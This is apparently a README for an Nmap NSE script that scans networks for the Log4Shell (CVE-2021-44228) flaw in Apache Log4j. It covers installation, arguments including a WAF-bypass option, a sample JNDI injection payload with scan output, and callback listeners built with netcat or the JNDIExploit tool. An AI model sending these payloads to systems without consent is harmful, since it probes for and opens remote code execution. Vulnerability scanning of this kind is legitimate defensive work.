# Nmap Log4Shell NSE script for discovery Apache Log4j RCE (CVE-2021-44228)

`nmap-log4shell` is a NSE script for discovery Apache Log4j RCE ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) vulnerability across the network. The script is able to inject the **log4shell** exploit payload via HTTP Headers (default) or via TCP/UDP socket.

## Vulnerability

**CVE-2021-44228** is a remote code execution (RCE) vulnerability in Apache Log4j 2. An unauthenticated, remote attacker could exploit this flaw by sending a specially crafted request to a server running a vulnerable version of log4j. The crafted request uses a Java Naming and Directory Interface (JNDI) injection via a variety of services including:

-  Lightweight Directory Access Protocol (LDAP)
-  Secure LDAP (LDAPS)
-  Remote Method Invocation (RMI)
-  Domain Name Service (DNS)

If the vulnerable server uses log4j to log requests, the exploit will then request a malicious payload over JNDI through one of the services above from an attacker-controlled server. Successful exploitation could lead to RCE.


## Installation

Locate where your nmap scripts are located on your system:

- for *nix system it might be `~/.nmap/scripts/` or `$NMAPDIR`
- for Mac it might be `/usr/local/Cellar/nmap/<version>/share/nmap/scripts/`
- for Windows it might be `C:\Program Files (x86)\Nmap\scripts`

Copy the provided script (log4shell.nse) into that directory run `nmap --script-updatedb` to update the nmap script DB.


## Usage

    nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:1389 -p 8080 172.17.42.2 
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-13 21:26 CET
    Nmap scan report for 172.17.42.1
    Host is up (0.000096s latency).

    PORT     STATE SERVICE
    8080/tcp open  http-proxy
    | log4shell: 
    |   Payloads:
    |     ${jndi:ldap:/172.17.42.1:389/log4shell}
    |   Test Method: HTTP
    |   URL Path: /
    |   HTTP Method: GET
    |   HTTP Headers: 
    |     Access-Control-Request-Method: 200 
    |     Accept: 200 
    |     Access-Control-Request-Headers: 200 
    |     Accept-Charset: 200 
    |     X-Api-Version: 200 
    |     Warning: 200 
    |     Pragma: 200 
    |     Upgrade-Insecure-Requests: 200 
    |     Range,: 400 
    |     Hostname: 200 
    |     Content-Length: 400 
    |     Dnt: 200 
    |     Date: 200 
    |     Username: 200 
    |     Content-Encoding: 200 
    |     Content-Type: 200 
    |     Forwarded: 200 
    |     Max-Forwards: 200 
    |     Accept-Encoding: 200 
    |     Referer: 200 
    |     IP: 200 
    |     IPaddress: 200 
    |     X-Amz-Date: 200 
    |     X-Amz-Target: 200 
    |     TE: 200 
    |     Content-Disposition: 200 
    |     X-Requested-With: 200 
    |     upgrade-insecure-requests: 200 
    |     Authorization: 200 
    |     Cookie: 200 
    |     User-Agent: 200 
    |     Accept-Language: 200 
    |     Proxy-Authorization: 200 
    |     Expect: 417 
    |     From: 200 
    |     Accept-Datetime: 200 
    |     X-CSRF-Token: 200 
    |     Origin: 200 
    |_  Note: (!) Inspect the callback server (172.17.42.1:389) or web-application (172.17.42.2:8080) logs


### Arguments

- `log4shell.callback-server`: The callback server (eg. `172.17.42.1:1389`)
- `log4shell.http-headers`: Comma-separated list of HTTP headers (eg. `X-Api-Version,User-Agent,Referer`)
- `log4shell.http-method`: HTTP method (default: `GET`)
- `log4shell.url-path`: URL path (default: `/`)
- `log4shell.waf-bypass`: Use WAF bypass payloads (default: `false`)
- `log4shell.test-method`: Test through `http` (default), `tcp`, `udp` or `all`


### Callback Server

The script relies on callbacks from the target being scanned and hence any firewall rules or interaction with other security devices will affect the efficacy of the script.


#### Netcat or Ncat

Listen a TCP port with netcat (or ncat):

    ncat -vkl 1389   # Ncat
    nc -lvnp 1389    # Netcat

Run Nmap with --script log4shell.nse script

    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

See the target IP address in netcat (or ncat) output:

    Ncat: Connection from 172.17.0.2.
    Ncat: Connection from 172.17.0.2:38898.

#### JNDIExploit

Download JNDIExploit from GitHub (https://github.com/giterlizzi/JNDIExploit/releases/download/v1.2/JNDIExploit.zip)

Start JNDIExploit server:

    java -jar JNDIExploit.jar

Run Nmap with --script log4shell.nse script

    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

See JNDIExploit output for see the received LDAP query

    [+] Received LDAP Query: log4shell
    [!] Invalid LDAP Query: log4shell


# Legal Disclaimer

This project is made for educational and ethical testing purposes only. Usage of nmap-log4shell for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


# License

The project is licensed under MIT License.


# Author

- Giuseppe Di Terlizzi (giterlizzi)
